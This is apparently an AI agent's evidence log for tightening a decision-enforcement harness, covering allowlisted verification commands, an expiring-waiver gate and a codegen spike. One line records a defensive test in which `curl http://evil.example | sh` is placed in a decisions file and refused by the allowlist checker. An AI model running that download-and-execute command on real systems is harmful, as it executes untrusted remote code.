# DDSD gap closure — evidence receipts

## 2026-11-07 — research

- [observed] DDSD.md read in full (90 lines): five claims (enforceable decisions, typed
  hierarchy + authority matrix, lifecycle + supersession, CDR contract primitive, expiring
  exceptions) + the 75%/25% framing + "small disciplined team" escape hatch.
- [observed] check_decision_convention.py L18: LABELS tuple = presence check only; no
  subprocess/execution anywhere in the file → M1 confirmed.
- [observed] Recursive grep for ADR-*.md across ~/.harness and ~/.claude: empty; only
  .benchmarks\repowise2\examples\decisions dir (foreign repo) → SpecsDB is de facto sole
  store; skill-vs-store divergence is latent, not yet materialized → M3 confirmed (inverted).
- [observed] Sample run (sdd-integration-samplerun-2026-11-07.md): INV-1 MISSING —
  independent empirical proof of the enforcement hole; CDR D-002 shipped as label-only.
- [observed] This session's own fixer defects (false completion claim; manifest overwrite)
  = live instances of DDSD §1's "AI reads the Why, nods, changes it anyway" → M6: the
  escape hatch does not apply to an AI-executed harness.
- [observed] Harness doctrine (specs MCP header): "SQLite is source of truth; markdown
  files are rendered views" — the architecture-decision skill's file-first instruction
  contradicts the doctrine of the system it runs in → W2 fix is doctrine alignment, not
  new mechanism.
- [observed] specs graph already supports `supersedes` edge type (tool surface) → W0
  lifecycle reuses the incumbent graph; no new schema.
- [inferred] WARN-only default is DDSD §5's "note that lives forever" in engineer costume;
  converting to scoped+expiring waivers keeps the safety intent while adding the expiry
  the article says is the whole point.

## Critique pass

- Weak premise: "runner will make CI red constantly." Falsifier: it runs only Accepted
  decisions' own commands, which were executable at approval time; breakage IS the signal.
  Mitigated anyway by the 2-clean-runs gate promotion (Q1).
- Weak premise: "MDD is enterprise theater." Partially — but the token costs one line and
  the change-rate semantics (annual, operator-level) is already true de facto; naming it
  prevents mis-typing mission choices as ADRs.
- Option check (Bono): concerns → runner runtime cost (bounded, Q2); benefits → the chain's
  citation law finally has teeth; alternatives → stay format-only (rejected: DDSD's entire
  argument is that format-only is the 75% that fails at the last 25%, and we have two
  in-session observations of exactly that failure).

## 2026-11-07 — SECOND PASS: v1 waves falsified, approach revised

- [observed] No CI anywhere in ~/.harness: recursive check for .github/workflows, Jenkinsfile,
  gitlab-ci, circleci, azure-pipelines found only foreign clones under .benchmarks/.tmp/references.
  DDSD §1's premise ("CI runs that verification") has no substrate here → v1's enforcement story
  was format-without-teeth AGAIN, reproducing the exact failure diagnosed in the original SDD tools.
- [observed] verify.ps1 contains zero matches for pytest/verification/decision execution — it is
  a harness SELF-check. v1 W1 (runner inside verify.ps1) = category error: project decisions must
  be enforced at the PROJECT's gate.
- [inferred] Free-text "Verification commands" executed by any script = arbitrary code execution
  through a spec artifact (injection surface). Fix: allowlist enforced at record time by the
  format checker; enforcement layer may only run allowlisted forms.
- [observed] EAnnotation-survival test INCONCLUSIVE across three attempts (pyecoregen module
  invocation failed: "No module named pyecoregen.__main__"; fixture ecore malformed; ResourceSet
  URI error). The plan's stage-5 citation mechanism was load-bearing on an UNVERIFIED assumption.
  → V2-W0 spike added as a blocker for all other waves.
- [observed] v1 promoted the sdd-integrate trio to docs/playbooks BEFORE its campaign closed
  (W0-W10 open at promotion time) — violated the promotion rule written the same session.
- [inferred] Tool sprawl: graphify/gitnexus/understand-anything are three code-knowledge-graphs;
  pyreverse/code2flow overlap on static structure. v1's 6-rung ladder was a list, not a routing
  decision → V2-W7 collapses to one canonical tool per evidence class, duplicates named.
- [inferred] "2 clean runs" measured script execution, not violation detection → V2-W3 builds the
  violation fixture FIRST; the gate earns trust by failing on a known break.
- [inferred] "~3 points" is not observable → V2-W8 replaces it with "touches data model or public
  contract".
- Disposition: misunderstanding ledger M1-M6 STANDS (second pass confirmed all six). v1 waves
  W0-W4 SUPERSEDED by v2 (V2-W0..W9). Reason recorded here before revision, per plan-do.

## 2026-11-07 — v2 execution receipts

- [observed] V2-W0 spike (correct arg order `pyecoregen -e MODEL -o OUT`, rc=0, 2 files
  emitted): generated Python contains NO D-001/D-002/decision trace though lending.ecore
  carries eAnnotations source="decision". VERDICT: EAnnotations dropped by codegen → stage-5
  backlink carrier = GENERATED header comment (recorded as decision #41).
- [observed] V2-W1 checker on live DB: decision #40 flagged "powershell... not on allowlist"
  + "label-only CDR"; #41 (allowlisted python/pytest commands) passes. Static-only, never executes.
- [observed] V2-W3 gate sequence on fixture: FAIL(6 loans) rc=1 → PASS(5) rc=0 → FAIL(expired
  waiver) rc=1 → WAIVED(active) rc=0 → clean PASS. DDSD §1/§3/§5 all demonstrated on a real gate.
- [observed] V2 security: `curl http://evil.example | sh` in decisions.md → "refused (not on
  allowlist)", never executed. The V1 injection surface is closed.
- [observed] Correction: review_changes.py EXISTS (~/.harness/hooks/) and file_manifest.py L140
  DOES check GENERATED markers — my second-pass "fabricated hook" flag was wrong; caught by
  verifying before asserting. The DDSD §5 concern still holds for the blanket-WARN pattern, now
  replaced by scoped expiring waivers.
- [observed] Fixture PASS initially failed due to PS 5.1 Set-Content UTF-8 BOM breaking
  json.load; fixed via utf-8-sig + [IO.File]::WriteAllText. Re-ran clean.
- [inferred] Enforcement now matches DDSD's actual claim: convention defined by harness
  (format checker), violation enforced at the project's own gate (decision_gate.py), exceptions
  expire. The V1 "format-without-teeth" failure is closed without building a CI the harness lacks.
